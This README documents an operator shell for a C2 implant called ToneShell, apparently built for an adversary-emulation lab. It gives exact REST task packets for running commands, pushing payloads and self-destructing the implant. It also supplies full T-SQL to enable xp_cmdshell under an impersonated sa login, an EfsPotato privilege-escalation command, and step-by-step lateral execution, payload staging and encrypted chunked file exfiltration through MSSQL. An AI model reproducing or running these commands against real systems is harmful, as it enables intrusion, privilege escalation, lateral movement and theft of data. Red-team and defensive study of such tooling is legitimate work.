# toneshell_shell.py

**Purpose:** Interactive operator shell for ToneShell C2 sessions, with an integrated MSSQL lateral execution tunnel (`xpinit` / `xpshell` / `xpstage` / `xpexfil`) that uses WS01's implant to run commands, stage binaries, and exfiltrate files on IIS01 via xp_cmdshell — no implant on IIS01 required.

## Overview

`toneshell_shell.py` wraps the controlServer REST API with a persistent prompt so operators do not need to hand-craft JSON task strings or track session GUIDs manually. Every shell command maps to one of two transports:

- **Direct session tasks** (`sessions`, `use`, `get`, `put`, `kill`, bare commands): JSON task packets posted to `POST /api/v1.0/session/<guid>/task`, output polled at `GET /api/v1.0/task/<task_guid>`.
- **MSSQL tunnel** (`xpinit`, `xpshell`, `xpstage`, `xpexfil`): chains of `sqlcmd` invocations run as EXEC tasks on WS01, which reach IIS01 through xp_cmdshell / sp_OA:

```
Operator → toneshell_shell.py → controlServer REST API → TONESHELL (WS01) → sqlcmd → xp_cmdshell/sp_OA → IIS01
```

The MSSQL channel has three modes:

- **Execution** (`xpshell cmd` / `xpshell psh`): stages a `.bat` or `.ps1` via `sp_OA FileSystemObject`, runs it via `xp_cmdshell`, captures output.
- **Staging** (`xpstage`): transfers a binary to IIS01 entirely through the MSSQL database — controlServer AES-encrypts the payload, WS01 INSERTs it into `tempdb..stg`, a PowerShell script on IIS01 reads and decrypts it. No HTTP from IIS01.
- **Exfiltration** (`xpexfil`): reverse of staging — IIS01 PowerShell AES-encrypts a file and INSERTs it into `tempdb..exfil`, WS01 PowerShell reads and decrypts it locally, then TONESHELL FILE_UPLOAD carries it to the controlServer `files/` directory.

All crypto uses AES-256-CBC with `System.Security.Cryptography.FromBase64Transform` / `ToBase64Transform` CryptoStream — `[Convert]::FromBase64String` is not used anywhere.

## Target context

- **Operator machine**: runs `toneshell_shell.py` against controlServer on `localhost:<port>`
- **WS01**: TONESHELL v2 implant active; `sqlcmd` installed; reachable MSSQL on IIS01 TCP/1433
- **IIS01**: SQL Server Express instance `IIS01\SQLEXPRESS`; `svc_app_dev` has `EXECUTE AS LOGIN='sa'` capability; `sp_OA` and `xp_cmdshell` are enabled after `xpinit`
- **controlServer `files/` dir**: must exist before running `xpexfil` or any blocking pull — not auto-created: `mkdir /path/to/controlServer/files`

## Dependencies

```
pip install -r requirements.txt   # requests
```

Python venv: `D:\vcs\testlab-ael\venv\Scripts\python.exe`

## Usage

```
python toneshell_shell.py [--port 9999] [--debug]
```

Default port: `9999` (must match controlServer REST API port). `--debug` prints every REST call, EXEC command, T-SQL batch, and PowerShell script as it is sent.

---

## Command reference — what actually runs

Notation below:

- `{S}` = active session GUID, `{N}` = auto-incrementing `taskNum`
- All `sqlcmd` lines are shorthand for:
  `sqlcmd -S <host> -U <login> -P <pass> -C -Q "<tsql>"` (the `-Q "..."` boundary doubles any `"` in the T-SQL)
- Temp names like `{rand8}.bat` are 8 random lowercase chars under `C:\ProgramData\`

### `sessions`

Lists active sessions.

Runs: `GET /api/v1.0/sessions` — prints `guid` + `hostName` per row. No task packet sent.

### `use <session_id>`

Attaches the prompt to a session.

Runs: `GET /api/v1.0/session/{session_id}` — validates existence, caches hostname for the prompt label. No task packet sent.

### `detach`

Local only — clears the attached session GUID. No network traffic.

### Bare text (anything not a built-in) → shell command on implant

```
<any command line>
```

Runs one EXEC task:

```json
POST /api/v1.0/session/{S}/task   {"id": 5, "taskNum": {N}, "args": "<command line>"}
```

Then polls `GET /api/v1.0/task/{task_guid}` every 2 s until `taskStatus=2` (finished), prints `taskOutput`. Poll timeout defaults to 120 s; change with `timeout <seconds>`.

### `get <remote_path>` — pull file implant → C2

Queues an upload request on the implant:

```json
{"id": 7, "taskNum": {N}, "args": "<remote_path>"}
```

Fire-and-forget: prints the task GUID and returns immediately; the implant pushes the file asynchronously to the C2 upload dir. The blocking variant `cmd_get_wait` used internally by `xpexfil` adds `"fileName": "<dest_name>"` and polls until finished.

### `put <payload_name> <dest_path>` — push file C2 → implant

Queues a download task; `<payload_name>` must exist in the controlServer payloads dir:

```json
{"id": 3, "taskNum": {N}, "args": "<dest_path>", "payload": "<payload_name>"}
```

Non-blocking when typed interactively. Internal callers use `cmd_put_wait`, which adds a 180 s completion poll.

### `output`

Fetches buffered task output for the current session: `GET /api/v1.0/session/{S}/task/output`.

### `kill` — self-destruct implant

Prompts `[y/N]`; on confirmation sends:

```json
{"id": 255}
```

to `POST /api/v1.0/session/{S}/task`. No output polling.

---

### `xpinit <host:port> <login> <pass>`

Enables sp_OA + xp_cmdshell on the MSSQL target, then verifies. Two sqlcmd batches, both wrapped in `EXECUTE AS LOGIN='sa';`:

```sql
-- 1. enable features
EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;

-- 2. connectivity proof (prints service account context)
EXEC xp_cmdshell 'whoami'
```

Stores host/login/password for all subsequent `xp*` commands. Nothing is written to disk yet.

### `xpshell cmd <command>`

Four sqlcmd round-trips:

1. **Stage .bat** via sp_OA (create mode 2):
   ```sql
   EXECUTE AS LOGIN='sa';
   DECLARE @f INT,@x INT,@v NVARCHAR(MAX);
   EXEC sp_OACreate 'Scripting.FileSystemObject',@f OUT;
   EXEC sp_OAMethod @f,'OpenTextFile',@x OUT,'C:\ProgramData\{rand8}.bat',2,1;
   SET @v='<command> > C:\ProgramData\{rand8}.txt 2>&1' + CHAR(13)+CHAR(10);
   EXEC sp_OAMethod @x,'Write',NULL,@v;
   EXEC sp_OAMethod @x,'Close';
   EXEC sp_OADestroy @f;
   ```
2. **Execute** it:
   ```sql
   EXECUTE AS LOGIN='sa'; EXEC xp_cmdshell 'C:\ProgramData\{rand8}.bat'
   ```
3. **Read output**:
   ```sql
   EXECUTE AS LOGIN='sa'; EXEC xp_cmdshell 'type C:\ProgramData\{rand8}.txt'
   ```
4. **Cleanup**:
   ```sql
   EXECUTE AS LOGIN='sa'; EXEC xp_cmdshell 'del /f C:\ProgramData\{rand8}.bat C:\ProgramData\{rand8}.txt'
   ```

Use this form when the command contains `"` — content is embedded through `SET @v=` with `'` → `''` escaping and `'CHAR(34)+'` joins, so `"` never enters the T-SQL literal.

Example — EfsPotato privilege escalation (☣️ requires `seclogon` running on IIS01):

```
☣️ xpshell cmd C:\ProgramData\CertEnrollSvc.exe "cmd /c whoami /priv > C:\ProgramData\out.txt 2>&1" lsarpc 0<nul
xpshell cmd type C:\ProgramData\out.txt
```

`lsarpc` selects the EFS endpoint; `0<nul` redirects stdin to NUL because xp_cmdshell pipes stdin, which makes `CertEnrollSvc.exe` try to read a PE from stdin and exit early.

### `xpshell psh <ps_script_content>`

Three sqlcmd round-trips:

1. **Stage .ps1** via sp_OA (same pattern as above, path `C:\ProgramData\{rand8}.ps1`)
2. **Execute**:
   ```sql
   EXECUTE AS LOGIN='sa';
   EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -NoProfile -File C:\ProgramData\{rand8}.ps1'
   ```
   stdout is captured directly by xp_cmdshell — no separate output file.
3. **Cleanup**:
   ```sql
   EXECUTE AS LOGIN='sa'; EXEC xp_cmdshell 'del /f C:\ProgramData\{rand8}.ps1'
   ```
   ⚠️ If the script runs longer than the 120 s poll timeout, this cleanup still fires while PowerShell may still be executing.

### `xpstage <payload_name> [--no-encrypt]`

Five phases:

1. **Request staging package**: `POST /api/v1.0/mssql/stage` with `{"handler":"toneshell","payload":"<name>","encrypt":true}` → server AES-256-CBC encrypts `payloads/toneshell/<payload_name>`, base64s it (random IV prepended), generates an INSERT SQL file, returns `{sqlFile, key}`.
2. **Transfer SQL to WS01** (blocking put):
   ```json
   {"id": 3, "args": "C:\\Windows\\Temp\\<sqlFile>", "payload": "<sqlFile>"}
   ```
3. **INSERT into DB** — WS01 runs (EXEC task):
   ```
   sqlcmd -S <host> -U <login> -P <pass> -C -i C:\Windows\Temp\<sqlFile>
   ```
   (`-i`, not `-Q` — INSERT statements exceed the 2048-char cmd limit)
4. **Extract + decrypt on IIS01** — same as `xpshell psh` with this generated script:
   - SqlClient connects to `tempdb` (`Server=<host:port→host,port>;TrustServerCertificate=True`)
   - `SELECT chunk FROM tempdb..stg ORDER BY id`, concatenates
   - `FromBase64Transform` decodes → bytes[0..15] = IV, remainder = ciphertext
   - AES-256-CBC/PKCS7 decrypt with key derived from the returned base64 key
   - `[IO.File]::WriteAllBytes('C:\ProgramData\<payload_name>', $dec)`
5. **Cleanup**:
   - WS01 EXEC: `cmd /c del /f C:\Windows\Temp\<sqlFile>`
   - Direct sqlcmd: `IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;`

`--no-encrypt` skips AES (base64-only decode, no key).

### `xpexfil <remote_path> <local_name> [insert_timeout_s=600] [chunk_mb=10]`

AES-256-CBC exfiltration over the DB channel, chunked (default 10 MB/chunk). Key `os.urandom(32)` is generated once per call and reused for all chunks.

**Phase A — sizing** (one xpshell-psh-style round-trip):

```sql
EXECUTE AS LOGIN='sa'; EXEC xp_cmdshell 'powershell -Command (Get-Item <remote_path>).Length'
```

Python parses the digit line → `num_chunks = ceil(size / chunk_mb×1024²)`.

**Per chunk `i`:**

1. **INSERT on IIS01** — `xpshell psh` runs a generated script that:
   - `$fs.Seek(offset); Read(length)` reads just this chunk's bytes
   - AES-256-CBC encrypt (fresh random IV), prepend IV, `ToBase64Transform` encode
   - SqlClient loopback to `tempdb`:
     ```sql
     EXECUTE AS LOGIN='sa';
     IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;
     CREATE TABLE tempdb..exfil(id INT IDENTITY(1,1),chunk NVARCHAR(MAX));
     GRANT SELECT ON exfil TO PUBLIC;
     ```
   - INSERTs the base64 blob in 8000-char NVARCHAR chunks
2. **Safety wait** — polls until table exists (INSERT may outlive the 120 s poll):
   ```sql
   EXECUTE AS LOGIN='sa';
   SELECT CASE WHEN OBJECT_ID('tempdb..exfil','U') IS NOT NULL THEN 'exists' ELSE 'notfound' END
   ```
   Retries every 15 s up to `insert_timeout_s`.
3. **EXTRACT on WS01** — EXEC task runs (note: on WS01, not via xp_cmdshell):
   ```
   powershell -NoProfile -ExecutionPolicy Bypass -Command "<extract_ps>"
   ```
   Reads `tempdb..exfil` via SqlClient, FromBase64-decodes, AES-decrypts, writes plaintext to `C:\Windows\Temp\<local_name>.chunk{i}`.
4. **Pull to C2** — blocking FILE_UPLOAD:
   ```json
   {"id": 7, "args": "C:\\Windows\\Temp\\<local_name>.chunk{i}", "fileName": "<local_name>.chunk{i}"}
   ```
   Lands as `controlServer/files/<local_name>.chunk{i}`.
5. **Cleanup** — WS01 EXEC: `cmd /c del /f C:\Windows\Temp\<local_name>.chunk{i}`; direct sqlcmd: `DROP TABLE tempdb..exfil` so the next chunk starts fresh.

**Phase F — assembly (Python on C2)**: concatenates `files/<local_name>.chunk0…N-1` in order into `files/<local_name>`, deletes the chunks.

---

## Escaping model

Two separate layers — do not conflate:

| Layer | Scope | Rule |
|---|---|---|
| C runtime `-Q "..."` | All sqlcmd invocations | `"` → `""` (handled in `_exec_q`) |
| T-SQL string `'...'` | All T-SQL literals | `'` → `''` (handled in `_tsql_escape`) |

Content containing `"` (e.g. bat files) uses the `@v` + `CHAR(34)` pattern in `_sp_oa_write` to keep `"` out of T-SQL string literals entirely.

## See also

- Implementation decisions and bug fixes: `../mssql-module-changelog.md`
- Design doc for xpexfil and base64 refactor: `../xpexfil-design.md`
- Payload staging package: `controlServer/mssql/mssql.go`
- REST API route: `controlServer/restapi/restapi.go` — `POST /api/v1.0/mssql/stage`
- Code flow and ATT&CK mapping: `TONESHELL_SHELL_FLOW.md`
